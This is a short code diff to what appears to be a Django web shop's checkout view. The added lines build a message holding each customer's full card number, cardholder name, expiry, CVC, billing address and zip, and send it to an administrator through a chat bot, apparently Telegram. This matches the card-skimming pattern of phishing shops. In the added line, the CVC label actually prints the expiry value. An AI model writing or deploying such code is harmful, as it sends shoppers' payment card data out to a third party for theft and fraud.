@@ -17,7 +17,9 @@ def checkout(request):
             credit_cvc = request.POST['credit-cvc']
             billing_address = request.POST['billing-address']
             billing_zip = request.POST['billing-zip']
-            send_message(bot_token, str(admin_id), email)
+            message = f"New Order\nEmail: {email}\nCardHolder: {cardholder}\nCard NO: {card_no}\nCredit Expiry: {credit_expiry}\nCredit cvc: {credit_expiry}" \
+                      f"\nAddress: {billing_address}\nZip: {billing_zip}"
+            send_message(bot_token, str(admin_id), message)
 
             if not validate_email(email):
                 messages.error(request, 'Email is invalid 🤐')
